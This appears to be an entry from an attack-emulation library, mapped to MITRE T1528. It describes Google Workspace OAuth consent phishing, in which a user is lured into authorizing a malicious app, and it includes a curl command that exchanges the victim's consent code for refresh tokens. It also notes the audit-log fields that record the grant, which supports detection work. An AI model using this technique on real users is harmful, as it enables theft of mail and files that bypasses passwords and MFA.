---
id: gws-oauth-grant
title: Google Workspace malicious OAuth grant (consent phish)
section: Google Workspace / identity
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1528]
platform: [gws]
source: Google Workspace consent-phishing (illicit OAuth grant)
pair: gws-oauth-audit
---

The consent-phish: stand up a third-party OAuth app requesting Gmail/Drive scopes and
phish a user into authorizing it. Their click hands you a refresh token that reads mail
and files with no password and no MFA prompt — and it survives their password reset until
the grant is revoked. Google logs the consent in the **token** audit as `authorize` with
the `client_id`, `app_name`, and requested `scope`. (Cloud IdP — no on-host target, so no
slots.)

```sh
# after the victim consents to the app's Gmail/Drive scopes, exchange the code for tokens
curl -s -X POST "https://oauth2.googleapis.com/token" \
  -d client_id=<client_id> -d client_secret=<secret> -d grant_type=authorization_code \
  -d code=<consent_code> -d redirect_uri=<redirect>
```
